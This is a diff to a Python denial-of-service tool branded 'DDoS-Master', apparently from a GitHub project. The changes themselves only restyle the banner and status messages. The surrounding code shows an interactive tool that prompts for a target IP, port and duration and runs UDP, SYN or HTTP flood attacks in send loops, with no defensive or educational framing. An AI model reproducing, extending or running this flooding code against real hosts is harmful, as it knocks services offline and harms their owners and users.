@@ -21,26 +21,27 @@ banner = """
 
 print(colored(banner, 'cyan'))
 print()
-print()
-print(colored("      (Author)   : Shadow_Sadist/Rip70022", 'green'))
-print(colored("      (Github)   : https://github.com/Rip70022", 'red'))
-print(colored("          Offense is always the best defense!", 'magenta'))
-print(colored("        You are using DDoS-Master Version: 1.0", 'yellow'))
+print(colored("       ╭───────────────────────────────────────────╮", 'cyan'))
+print(colored("       │(Author) =   Shadow_Sadist/Rip70022        │", 'green'))
+print(colored("       │(Github) =   https://github.com/Rip70022   │", 'red'))
+print(colored("       │  Offense is always the best defense!      │", 'magenta'))
+print(colored("       │ [You are using DDoS-Master Version: 1.0]  │", 'yellow'))
+print(colored("       ╰───────────────────────────────────────────╯", 'cyan'))
 print()
 
 # Prompt for target IP and port
-ip = input(colored("Enter the target IP: ", 'green'))
+ip = input(colored("[!] Enter the target IP: ", 'green'))
 try:
-    port = int(input(colored("Enter the target port: ", 'blue')))
+    port = int(input(colored("[!] Enter the target port: ", 'blue')))
 except ValueError:
-    print(colored("Invalid port. Exiting...", 'red'))
+    print(colored("[X] Invalid port. Exiting...", 'red'))
     sys.exit()
 
 # Prompt for attack duration
 try:
-    dur = int(input(colored("Enter the duration of the attack in seconds: ", 'yellow')))
+    dur = int(input(colored("[!] Enter the duration of the attack in seconds: ", 'yellow')))
 except ValueError:
-    print(colored("Invalid duration. Exiting...", 'red'))
+    print(colored("[X] Invalid duration. Exiting...", 'red'))
     sys.exit()
 
 # Function to perform the UDP Flood attack
@@ -64,7 +65,7 @@ def udp_flood(ip, port, message, dur):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(colored(f"Sent packet {packet_count}", "cyan"))
+            print(colored(f"[@] Sent packet {packet_count}", "cyan"))
         except socket.error:
             # If the socket is not able to send the packet, break the loop
             break
@@ -95,7 +96,7 @@ def syn_flood(ip, port, duration):
         except OSError:
             pass
         except KeyboardInterrupt:
-            print(colored("\n[*] Attack stopped.", 'red'))
+            print(colored("\n[*]  Attack stopped.", 'red'))
             sys.exit()
         finally:
             sock.close()  # Make sure to close the socket in all cases 
@@ -121,7 +122,7 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(colored(f"HTTP Packets sent: {sent} to target: {ip}", "yellow"))
+            print(colored(f"[@] HTTP Packets sent: {sent} to target: {ip}", "yellow"))
         except KeyboardInterrupt:
             print(colored("\n[-] Attack stopped by user", "red"))
             break
@@ -130,19 +131,19 @@ def http_flood(ip, port, duration):
 
 # Prompt for the type of attack
 attack_type = input(colored(
-    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+    "[$] Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
-    message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "blue"))
+    message = b"[A] Sending 1337 packets baby"
+    print(colored("[A] UDP attack selected", "blue"))
     udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "green"))
+    print(colored("[%] UDP attack completed", "green"))
 elif attack_type == "3":
-    print(colored("SYN attack selected", "magenta"))
+    print(colored("[A] SYN attack selected", "magenta"))
     syn_flood(ip, port, dur)
 elif attack_type == "2":
-    print(colored("HTTP attack selected", "cyan"))
+    print(colored("[A] HTTP attack selected", "cyan"))
     http_flood(ip, port, dur)
 else:
-    print(colored("Invalid attack type. Exiting...", "red"))
+    print(colored("[☇] Invalid attack type. Exiting...", "red"))
     sys.exit()
